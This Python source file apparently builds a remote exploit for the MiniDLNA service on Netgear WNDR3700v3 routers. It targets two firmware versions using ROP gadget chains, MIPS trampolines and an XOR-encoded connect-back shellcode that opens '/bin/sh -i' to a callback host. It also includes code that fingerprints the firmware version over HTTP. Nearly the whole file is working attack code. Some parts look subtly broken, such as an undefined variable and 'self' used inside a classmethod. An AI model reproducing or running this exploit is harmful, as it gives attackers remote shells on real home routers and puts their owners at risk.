import signal
import os
import struct

from urllib2 import HTTPError

from bowcaster.overflow_development.overflowbuilder import OverflowBuffer,SectionCreator
from bowcaster.common.support import LittleEndian
from bowcaster.common.support import Logging
from bowcaster.servers import ConnectbackHost
from bowcaster.servers.connectback_server import ConnectbackServer
from bowcaster.payloads.mips.connectback_payload import ConnectbackPayload
from bowcaster.payloads.mips.trampoline import Trampoline
from bowcaster.encoders.mips import MipsXorEncoder
from bowcaster.clients.http import HttpClient

class WNDR3700v3(object):
    endianness=LittleEndian
    overflow_len=2048
    #bad sql bytes and their sqlite escaped equivalents
    minidlna_badbytes={'\x20':"x'20'",
                        '\x0d':"x'0d'",
                        '\x2d':"x'2d'"}

    def __init__(self,callback_ip_address,port,target_ip_address,logger=None):
        self.logger=logger
        self.target_ip_address = target_ip_address
        self.offset_modifier=len(target_ip_address)
        if not self.logger:
            self.logger=Logging()
        #"/usr/sbin/telnetd -p 31337"
        #"/bin/sh -i"
        self.connectback_host=ConnectbackHost(callback_ip_address,port)
        
        self.connectback_server=ConnectbackServer(self.connectback_host,
                                        startcmd="/bin/sh -i")
                                        
        
        self.endianness=self.__class__.endianness
        self.overflow_len=self.__class__.overflow_len
    
    def scan_for_nulls(self):
        return self.overflow_data.scan_for_nulls()

    def chunks(self,chunklen):
        string=self.overflow_data.overflow_string

        chunks=[]
        badchar_replacements=self.minidlna_badbytes
        while len(string) > 0:
            newstring = ""
            for i in range(0,chunklen):
                if len(string) <= 0:
                    break
                newstring+=string[0]
                string=string[1:]
            for k,v in badchar_replacements.items():
                if k in newstring:
                    self.logger.LOG_DEBUG("replacing with "+v)
                    newstring=newstring.replace(k,'\"||'+v+'||\"')
            chunks.append(newstring)

        return chunks
    def find(self,find_string):
        if find_string.startswith('0x'):
            find_string=struct.pack("<L",int(find_string,16))
        offset=self.overflow_data.find_offset(find_string)
        if offset > 0:
            offset+=self.offset_modifier
        return offset

    def serve_connectback(self):
        self.pid = self.connectback_server.serve_connectback()
        return self.pid

    def wait_connectback(self,kill=False):
        if self.pid:
            if(kill):
                os.kill(self.pid,signal.SIGTERM)
            return self.connectback_server.wait()


class WNDR3700v3_10018(WNDR3700v3):
    vesion_string="1.0.0.18"
    libc_actual=0x2af34000
    libc_qemu=0x4084a000
    libavcodec_actual=0x2b0a8000
    libavcodec_qemu=0
    
    @classmethod
    def minidlna_rop_gadgets(cls,target_ip_address,qemu=False):
        libc=0
        #libavcodec=0
        badbyte_list=['\x00']
        for k in cls.minidlna_badbytes.keys():
            badbyte_list.append(k)

        if qemu:
            libc=cls.libc_qemu
            #libavcodec=cls.libavcodec_qemu
        else:
            libc=cls.libc_actual
            #libavcodec=cls.libavcodec_actual
        
        sc=SectionCreator(cls.endianness,base_address=libc,badchars=badbyte_list)
        
        offset_modifier=self.offset_modifier
        print "offset_modifier: %d" % offset_modifier

        reg_ra=600-offset_modifier
        reg_s0=564-offset_modifier
        reg_s1=568-offset_modifier
        reg_s2=572-offset_modifier
        reg_s3=576-offset_modifier
        reg_s4=580-offset_modifier
        reg_s6=588-offset_modifier

        gadgets=[]
        
        #placeholders one and two get added together and passed as dst into memcpy(). They must add
        #up to be a writable address."
        
        gadget=sc.gadget_section(
                #752-offset_modifier,
                736-offset_modifier,
                0x15a3c932,
                base_address=0,
                description="placeholder 1 to avoid crashing memcpy.")
        gadgets.append(gadget)


        gadget=sc.gadget_section(
                752-offset_modifier,
                0x15a3c932,
                base_address=0,
                description="placeholder 2 to avoid crashing memcpy.")
        gadgets.append(gadget)


        #load 1 into $a0, jalr $s3
        gadget=sc.gadget_section(reg_ra,
                0x00025110,
                description="reg $ra. set up 3 sec arg to sleep(). jalr $s6.")
        gadgets.append(gadget)

        #load stack data into $ra, jr $s1
        gadget=sc.gadget_section(reg_s6,
                0x0001D95C,
                description="[reg $s6] setup ra before sleep(). jr $s1")
        gadgets.append(gadget)

        #address of sleep
        gadget=sc.gadget_section(reg_s1,
                0x506c0,
                description="[reg $s1] Address of sleep() in libc. be sure to set up $ra and $a0 before calling.",)
        gadgets.append(gadget)
        
        #[reg $s3] placeholder that allows $s3 to be dereferenced without crashing.

        gadget=sc.gadget_section(reg_s3,
                0x00011918,
                description="[reg $s3] placeholder that allows $s3 to be dereferenced without crashing.")
        gadgets.append(gadget)

        #[reg $ra] offset from $sp into $a2, jalr $s1.

        gadget=sc.gadget_section(640-offset_modifier,
                0x00011918,
                description="[reg $ra] offset from $sp into $a2, jalr $s1.")
        gadgets.append(gadget)
        
        #move $a2 to $s0, jalr $s4
        gadget=sc.gadget_section(632-offset_modifier,
                0x0003434C,
                description="[reg $s0] move $a2 to $s0, jalr $s4")
        gadgets.append(gadget)
        
        
        gadget=sc.gadget_section(reg_s4,
                0x0000BA84,
                description="[reg $s4] jalr $s0")
        gadgets.append(gadget)

        return gadgets

    def build_overflow(self,target_ip_address,encoder_class=None,qemu=False):
        badbyte_list=['\x00']
        for k in self.__class__.minidlna_badbytes.keys():
            badbyte_list.append(k)
            
        sc=SectionCreator(self.endianness,badchars=badbyte_list)
        
        #Must take into account length if IP addr
        #since it's part of the sprintf() that overflows
        offset_modifier=self.offset_modifier

        sections=self.__class__.minidlna_rop_gadgets(target_ip_address,qemu)
        
        trampoline_1=Trampoline(self.endianness,-672)
        section=sc.string_section(684-offset_modifier,
                            trampoline_1.shellcode,
                            description="First trampoline payload, jump back 672")
        sections.append(section)

        #1028, or 0x404, is the smallest operand to MIPS beq that
        #can >>2 bits and still have both bytes be non-null
        trampoline_2=Trampoline(self.endianness,1028)
        section=sc.string_section(16-offset_modifier,
                        trampoline_2.shellcode,
                        description="Second trampoline payload, jump forward 1028 ")
        sections.append(section)

        payload=ConnectbackPayload(self.connectback_host,self.endianness)
        if encoder_class:
            encoded_payload=encoder_class(payload,self.endianness,badbyte_list)
            payload=encoded_payload
        
        
        section=sc.string_section(1048-offset_modifier,
                        payload.shellcode,
                        description="connect-back payload")
        sections.append(section)
        

        buf=OverflowBuffer(self.endianness,self.overflow_len,SC.section_list,logger=self.logger)

        return buf

    def __init__(self,callback_ip_address,port,target_ip_address,encode=True,qemu=False,logger=None):
        super(self.__class__,self).__init__(callback_ip_address,port,target_ip_address,logger)
        self.encoder_class=None
        
        if encode:
            self.encoder_class=MipsXorEncoder
        
        self.overflow_data=self.build_overflow(target_ip_address,self.encoder_class,qemu)


class WNDR3700v3_10022(WNDR3700v3):
    libc_actual=0x2aedd000
    libc_qemu=None
    
    def __init__(self,callback_ip_address,port,target_ip_address,encode=True,qemu=False,logger=None):
        super(self.__class__,self).__init__(callback_ip_address,port,target_ip_address,logger)
        self.encoder_class=None
        
        self.qemu=qemu
        
        if encode:
            self.encoder_class=MipsXorEncoder
        
        self.overflow_data=self.build_overflow(target_ip_address,self.encoder_class,qemu)
        
    
    def build_overflow(self,target_ip_address,encoder_class=None,qemu=False):
        badbyte_list=['\x00']
        for k in self.__class__.minidlna_badbytes.keys():
            badbyte_list.append(k)
        if self.qemu:
            libc=self.libc_qemu
        else:
            libc=self.libc_actual
        
        offset_modifier=self.offset_modifier
        
        reg_ra=608-offset_modifier
        reg_s0=572-offset_modifier
        reg_s1=576-offset_modifier
        reg_s2=580-offset_modifier
        reg_s3=584-offset_modifier
        reg_s4=588-offset_modifier
        reg_s5=592-offset_modifier
        reg_s6=596-offset_modifier
        reg_s7=600-offset_modifier
        
        #after rop into fn epilogue
        new_reg_ra=648-offset_modifier
        new_reg_s0=636-offset_modifier
        new_reg_s1=640-offset_modifier
        new_reg_s2=644-offset_modifier
        
        
        SC=SectionCreator(self.endianness,base_address=libc,badchars=badbyte_list)
        
        #0x157BB0BA + 0x157BB0BA = 0x2AF76174, which should be somewhere
        #in libc's text segment
        SC.gadget_section(760-offset_modifier,
                            0x157BB0BA,
                            base_address=0,
                            description="placeholder 1 to avoid crashing memcpy.")
        
        SC.gadget_section(776-offset_modifier,
                            0x157BB0BA,
                            base_address=0,
                            description="placeholder 2 to avoid crashing memcpy.")
                                    
        SC.gadget_section(reg_ra,0x00028028,
                            description="[ra] load 1 into $a0, jalr $s3")
                            
        SC.gadget_section(reg_s2,0x00028028+0x7E88,
                            description="[s2] readonly placeholder to avoid crashing rop gadget.")
                            
        SC.gadget_section(reg_s3,0x0001D95C,
                            description="[s3] load stack offset into ra, jalr $s1")
        
        
        SC.gadget_section(reg_s1,0x000506C0,
                             description="[s1] address of sleep")
        
        SC.gadget_section(new_reg_ra,0x000427A8,
                            description="[ra] load $sp+0xE0+var_C0 into $s0, jalr $s6")
        
        SC.gadget_section(reg_s6,0x0000BA84,
                            description="[s6] jump into stack via $s0")
        
        SC.gadget_section(new_reg_s2,0x00028028,
                            description="[s2] readonly placeholder to avoid crashing stack finder gadget.")
        trampoline_1=Trampoline(self.endianness,-672)
        section=SC.string_section(684-offset_modifier,
                            trampoline_1.shellcode,
                            description="First trampoline payload, jump back 672")

        trampoline_2=Trampoline(self.endianness,1028)
        section=SC.string_section(16-offset_modifier,
                        trampoline_2.shellcode,
                        description="Second trampoline payload, jump forward 1028 ")
        
        payload=ConnectbackPayload(self.connectback_host,self.endianness)
        if encoder_class:
            encoded_payload=encoder_class(payload,self.endianness,badbyte_list)
            payload=encoded_payload
        
        
        section=SC.string_section(1048-offset_modifier,
                        payload.shellcode,
                        description="connect-back payload")

        
                             
        buf=OverflowBuffer(self.endianness,self.overflow_len,SC.section_list,logger=self.logger)

        return buf
        

WNDR3700_VERSIONS={"1.0.0.18":WNDR3700v3_10018,
                    "1.0.0.22":WNDR3700v3_10022}

def WNDR3700_version_detect(host):
    client=HttpClient()
    version=None
    url="http://%s" % host
    print "trying %s" %url
    try:
        client.send(url)
    except HTTPError as httpe:
        basic_realm=httpe.headers['www-authenticate']
    
    #all known v3 firmwares put WNDR3700v3 in basic realm header
    if basic_realm and "WNDR3700v3" in basic_realm:
        document=None
        try:
            document=client.send("http://%s/genie_apply.htm" % host)
        except HTTPError as httpe:
            #1.0.0.18 does not have genie and instead returns 401
            if httpe.code==401:
                version=WNDR3700_VERSIONS["1.0.0.18"]
        if document:
            #1.0.0.22 does have genie and genie_apply.htm does not require auth
            version = WNDR3700_VERSIONS["1.0.0.22"]
    
    if not version:
        raise Exception("WNDR3700 version not detected.")
    
    return version
    
    
    
